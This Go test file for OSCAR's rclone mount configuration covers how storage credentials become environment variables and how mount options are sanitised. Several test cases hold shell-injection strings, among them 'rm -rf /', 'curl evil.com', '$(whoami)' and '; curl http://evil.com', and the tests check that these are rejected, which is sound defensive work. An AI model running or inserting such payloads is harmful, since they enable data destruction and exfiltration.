/*
Copyright (C) GRyCAP - I3M - UPV

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package resources

import (
	"strings"
	"testing"

	"github.com/grycap/oscar/v4/pkg/types"
	v1 "k8s.io/api/core/v1"
)

func TestSetMount(t *testing.T) {
	podSpec := &v1.PodSpec{
		Containers: []v1.Container{
			{
				Name:  rcloneContainerName,
				Image: rcloneContainerImage,
				Env:   []v1.EnvVar{},
				VolumeMounts: []v1.VolumeMount{
					{
						Name:      rcloneVolumeName,
						MountPath: rcloneFolderMount,
					},
				},
			},
		},
		Volumes: []v1.Volume{},
	}
	service := types.Service{
		Mount: types.StorageIOConfig{
			Provider: "minio.provider",
			Path:     "test-bucket",
		},
		StorageProviders: &types.StorageProviders{
			MinIO: map[string]*types.MinIOProvider{
				"provider": {
					AccessKey: "test-access-key",
					SecretKey: "test-secret-key",
					Endpoint:  "test-endpoint",
				},
			},
		},
	}
	cfg := &types.Config{
		Name: "oscar",
		MinIOProvider: &types.MinIOProvider{
			AccessKey: "test-access-key",
			SecretKey: "test-secret-key",
		}}

	SetMount(podSpec, service, cfg)

	if len(podSpec.Containers) != 1 {
		t.Fatalf("expected 1 container, got %d", len(podSpec.Containers))
	}

	container := podSpec.Containers[0]
	if container.Name != rcloneContainerName {
		t.Errorf("expected container name %s, got %s", rcloneContainerName, container.Name)
	}

	if container.Image != rcloneContainerImage {
		t.Errorf("expected container image %s, got %s", rcloneContainerImage, container.Image)
	}

	if len(podSpec.InitContainers) != 1 {
		t.Fatalf("expected 1 init container, got %d", len(podSpec.InitContainers))
	}

	initContainer := podSpec.InitContainers[0]
	if len(initContainer.Args) != 2 {
		t.Fatalf("expected 2 args, got %d", len(initContainer.Args))
	}
	if initContainer.Args[0] != "-c" {
		t.Errorf("expected arg[0] to be '-c', got %s", initContainer.Args[0])
	}
	if !strings.Contains(initContainer.Args[1], "--allow-other") {
		t.Errorf("expected default communCommand flags in args, got %s", initContainer.Args[1])
	}

	expectedEnvVars := map[string]string{
		"MNT_POINT":             rcloneFolderMount,
		"MINIO_BUCKET":          "test-bucket",
		"AWS_ACCESS_KEY_ID":     "test-access-key",
		"AWS_SECRET_ACCESS_KEY": "test-secret-key",
		"MINIO_ENDPOINT":        "test-endpoint",
	}

	for _, envVar := range container.Env {
		if expectedValue, ok := expectedEnvVars[envVar.Name]; ok {
			if envVar.Value != expectedValue {
				t.Errorf("expected env var %s to have value %s, got %s", envVar.Name, expectedValue, envVar.Value)
			}
		} else {
			t.Errorf("unexpected env var %s", envVar.Name)
		}
	}

	if len(container.VolumeMounts) != 2 {
		t.Fatalf("expected 4 volume mounts, got %d", len(container.VolumeMounts))
	}

	if len(podSpec.Volumes) != 1 {
		t.Fatalf("expected 2 volumes, got %d", len(podSpec.Volumes))
	}
}

func TestSetMinIOEnvVars(t *testing.T) {
	service := types.Service{
		Mount: types.StorageIOConfig{
			Path: "test-bucket",
		},
		StorageProviders: &types.StorageProviders{
			MinIO: map[string]*types.MinIOProvider{
				"provider": {
					AccessKey: "test-access-key",
					SecretKey: "test-secret-key",
					Endpoint:  "test-endpoint",
				},
			},
		},
	}
	providerId := "provider"

	cfg := &types.Config{
		Name: "oscar",
		MinIOProvider: &types.MinIOProvider{
			AccessKey: "test-access-key",
			SecretKey: "test-secret-key",
		},
	}

	envVars := setMinIOEnvVars(service, providerId, cfg)

	expectedEnvVars := map[string]string{
		"MINIO_BUCKET":          "test-bucket",
		"AWS_ACCESS_KEY_ID":     "test-access-key",
		"AWS_SECRET_ACCESS_KEY": "test-secret-key",
		"MINIO_ENDPOINT":        "test-endpoint",
	}

	for _, envVar := range envVars {
		if expectedValue, ok := expectedEnvVars[envVar.Name]; ok {
			if envVar.Value != expectedValue {
				t.Errorf("expected env var %s to have value %s, got %s", envVar.Name, expectedValue, envVar.Value)
			}
		} else {
			t.Errorf("unexpected env var %s", envVar.Name)
		}
	}
}

func TestSetS3Vars(t *testing.T) {
	service := types.Service{
		Mount: types.StorageIOConfig{
			Path: "s3-bucket",
		},
		StorageProviders: &types.StorageProviders{
			S3: map[string]*types.S3Provider{
				types.DefaultProvider: {
					Region:    "eu-west-1",
					AccessKey: "ak",
					SecretKey: "sk",
				},
			},
		},
	}
	cfg := &types.Config{}

	vars := setS3Vars(service, types.DefaultProvider, cfg)
	if len(vars) != 4 {
		t.Fatalf("expected four S3 env vars, got %d", len(vars))
	}

	expected := map[string]string{
		"S3_BUCKET":             "s3-bucket",
		"S3_REGION":             "eu-west-1",
		"AWS_ACCESS_KEY_ID":     "ak",
		"AWS_SECRET_ACCESS_KEY": "sk",
	}

	for _, ev := range vars {
		if expected[ev.Name] != ev.Value {
			t.Fatalf("unexpected value for %s: %s", ev.Name, ev.Value)
		}
	}
}

func TestSetWebDavEnvVars(t *testing.T) {
	service := types.Service{
		Mount: types.StorageIOConfig{
			Path: "test-folder",
		},
		StorageProviders: &types.StorageProviders{
			WebDav: map[string]*types.WebDavProvider{
				"provider": {
					Login:    "test-login",
					Password: "test-password",
					Hostname: "test-hostname",
				},
			},
		},
	}
	providerId := "provider"

	envVars := setWebDavEnvVars(service, providerId)

	expectedEnvVars := map[string]string{
		"WEBDAV_FOLDER":   "test-folder",
		"WEBDAV_LOGIN":    "test-login",
		"WEBDAV_PASSWORD": "test-password",
		"WEBDAV_HOSTNAME": "https://test-hostname",
	}

	for _, envVar := range envVars {
		if expectedValue, ok := expectedEnvVars[envVar.Name]; ok {
			if envVar.Value != expectedValue {
				t.Errorf("expected env var %s to have value %s, got %s", envVar.Name, expectedValue, envVar.Value)
			}
		} else {
			t.Errorf("unexpected env var %s", envVar.Name)
		}
	}
}

func TestParseMountOptions(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{
			name:  "empty options",
			input: "",
			want:  "",
		},
		{
			name:  "valid flags",
			input: "--buffer-size 128M --vfs-read-chunk-size 64M",
			want:  "--buffer-size 128M --vfs-read-chunk-size 64M",
		},
		{
			name:  "valid dash flags",
			input: "--read-only --no-checksum",
			want:  "--read-only --no-checksum",
		},
		{
			name:  "valid tuning flags",
			input: "--timeout 30s --dir-cache-time=10s --vfs-cache-max-size 0",
			want:  "--timeout 30s --dir-cache-time 10s --vfs-cache-max-size 0",
		},
		{
			name: "legacy config rejected", input: "--config /etc/rclone/rclone.conf --timeout 30s", want: "",
		},
		{
			name: "rc rejected", input: "--buffer-size 128M --rc --rc-no-auth", want: "",
		},
		{
			name: "network rejected", input: "--http", want: "",
		},
		{
			name: "override rejected", input: "--s3-endpoint=attacker", want: "",
		},
		{
			name: "unknown rejected", input: "--foo", want: "",
		},
		{
			name: "missing value rejected", input: "--buffer-size", want: "",
		},
		{
			name: "flag as value rejected", input: "--buffer-size --rc", want: "",
		},
		{
			name: "invalid size rejected", input: "--buffer-size 128MB", want: "",
		},
		{
			name: "invalid duration rejected", input: "--timeout 0", want: "",
		},
		{
			name: "boolean value rejected", input: "--read-only=false", want: "",
		},
		{
			name: "tabs rejected", input: "--buffer-size	128M", want: "",
		},
		{
			name:  "rejects shell semicolon",
			input: "--foo; rm -rf /",
			want:  "",
		},
		{
			name:  "rejects shell pipe",
			input: "--foo | curl evil.com",
			want:  "",
		},
		{
			name:  "rejects command substitution",
			input: "--foo $(whoami)",
			want:  "",
		},
		{
			name:  "rejects backtick",
			input: "--foo `id`",
			want:  "",
		},
		{
			name:  "rejects ampersand",
			input: "--foo & whoami",
			want:  "",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed, err := ParseMountOptions(tt.input)
			if tt.want == "" && tt.input != "" {
				if err == nil {
					t.Errorf("ParseMountOptions(%q) = %q; expected rejection", tt.input, parsed)
				}
				return
			}
			if err != nil {
				t.Errorf("ParseMountOptions(%q) returned unexpected error: %v", tt.input, err)
			}
			if parsed != tt.want {
				t.Errorf("ParseMountOptions(%q) = %q, want %q", tt.input, parsed, tt.want)
			}
		})
	}
}

func TestParseMountOptionsRejectsInvalidInput(t *testing.T) {
	for _, opts := range []string{"  ", "--rc", "--config /tmp/config", "--buffer-size", "--buffer-size=--rc", "--timeout 1d", "--read-only=true"} {
		if parsed, err := ParseMountOptions(opts); err == nil || parsed != "" {
			t.Errorf("ParseMountOptions(%q) = %q, %v; expected rejection", opts, parsed, err)
		}
	}
}

func TestSidecarPodSpecRejectsStoredNetworkOptionsForAllProviders(t *testing.T) {
	service := types.Service{
		Mount: types.StorageIOConfig{Path: "bucket", Options: "--buffer-size 128M --rc"},
		StorageProviders: &types.StorageProviders{
			MinIO:  map[string]*types.MinIOProvider{"test": {}},
			S3:     map[string]*types.S3Provider{"test": {}},
			WebDav: map[string]*types.WebDavProvider{"test": {}},
		},
	}
	for _, provider := range []string{"minio.test", "s3.test", "webdav.test"} {
		service.Mount.Provider = provider
		container := sidecarPodSpec(service, &types.Config{})
		if len(container.Args) != 2 {
			t.Fatalf("unexpected %s sidecar args: %v", provider, container.Args)
		}
		if strings.Contains(container.Args[1], "--rc") || strings.Contains(container.Args[1], "--buffer-size") {
			t.Errorf("unsafe stored options reached %s sidecar: %v", provider, container.Args)
		}
	}
}

func TestSetMountWithOptions(t *testing.T) {
	podSpec := &v1.PodSpec{
		Containers: []v1.Container{
			{
				Name:  rcloneContainerName,
				Image: rcloneContainerImage,
				Env:   []v1.EnvVar{},
				VolumeMounts: []v1.VolumeMount{
					{
						Name:      rcloneVolumeName,
						MountPath: rcloneFolderMount,
					},
				},
			},
		},
		Volumes: []v1.Volume{},
	}
	service := types.Service{
		Mount: types.StorageIOConfig{
			Provider: "minio.provider",
			Path:     "test-bucket",
			Options:  "--buffer-size 128M --vfs-read-chunk-size 64M",
		},
		StorageProviders: &types.StorageProviders{
			MinIO: map[string]*types.MinIOProvider{
				"provider": {
					AccessKey: "test-access-key",
					SecretKey: "test-secret-key",
					Endpoint:  "test-endpoint",
				},
			},
		},
	}
	cfg := &types.Config{
		Name: "oscar",
		MinIOProvider: &types.MinIOProvider{
			AccessKey: "test-access-key",
			SecretKey: "test-secret-key",
		}}

	SetMount(podSpec, service, cfg)

	if len(podSpec.InitContainers) != 1 {
		t.Fatalf("expected 1 init container, got %d", len(podSpec.InitContainers))
	}

	initContainer := podSpec.InitContainers[0]
	if len(initContainer.Args) != 2 {
		t.Fatalf("expected 2 args, got %d", len(initContainer.Args))
	}
	if initContainer.Args[0] != "-c" {
		t.Errorf("expected arg[0] to be '-c', got %s", initContainer.Args[0])
	}

	args := initContainer.Args[1]
	if !strings.Contains(args, "--buffer-size 128M") {
		t.Errorf("expected mount option '--buffer-size 128M' in args, got: %s", args)
	}
	if !strings.Contains(args, "--vfs-read-chunk-size 64M") {
		t.Errorf("expected mount option '--vfs-read-chunk-size 64M' in args, got: %s", args)
	}
	if !strings.Contains(args, "--allow-other") {
		t.Errorf("expected default communCommand flags in args, got: %s", args)
	}
}

func TestSetMountRejectsMaliciousOptions(t *testing.T) {
	podSpec := &v1.PodSpec{
		Containers: []v1.Container{
			{
				Name:  rcloneContainerName,
				Image: rcloneContainerImage,
				Env:   []v1.EnvVar{},
				VolumeMounts: []v1.VolumeMount{
					{
						Name:      rcloneVolumeName,
						MountPath: rcloneFolderMount,
					},
				},
			},
		},
		Volumes: []v1.Volume{},
	}
	service := types.Service{
		Mount: types.StorageIOConfig{
			Provider: "minio.provider",
			Path:     "test-bucket",
			Options:  "; curl http://evil.com",
		},
		StorageProviders: &types.StorageProviders{
			MinIO: map[string]*types.MinIOProvider{
				"provider": {
					AccessKey: "test-access-key",
					SecretKey: "test-secret-key",
					Endpoint:  "test-endpoint",
				},
			},
		},
	}
	cfg := &types.Config{
		Name: "oscar",
		MinIOProvider: &types.MinIOProvider{
			AccessKey: "test-access-key",
			SecretKey: "test-secret-key",
		}}

	SetMount(podSpec, service, cfg)

	if len(podSpec.InitContainers) != 1 {
		t.Fatalf("expected 1 init container, got %d", len(podSpec.InitContainers))
	}

	initContainer := podSpec.InitContainers[0]
	args := initContainer.Args[1]

	// Ensure the malicious content was stripped out
	if strings.Contains(args, "curl") {
		t.Errorf("malicious option was not sanitized, args contains 'curl': %s", args)
	}
	if strings.Contains(args, ";") {
		t.Errorf("malicious option was not sanitized, args contains ';': %s", args)
	}

	// But the normal rclone content should still be there
	if !strings.Contains(args, "--allow-other") {
		t.Errorf("expected default communCommand flags in args, got: %s", args)
	}
	for _, legacy := range []string{"--rc", "--config /etc/rclone/rclone.conf", "--buffer-size 128M --rc"} {
		service.Mount.Options = legacy
		podSpec.InitContainers = nil
		SetMount(podSpec, service, cfg)
		command := podSpec.InitContainers[0].Args[1]
		if strings.Contains(command, "--rc") || strings.Contains(command, "--config") || strings.Contains(command, "--buffer-size 128M") {
			t.Errorf("legacy options %q reached mount command", legacy)
		}
	}
}
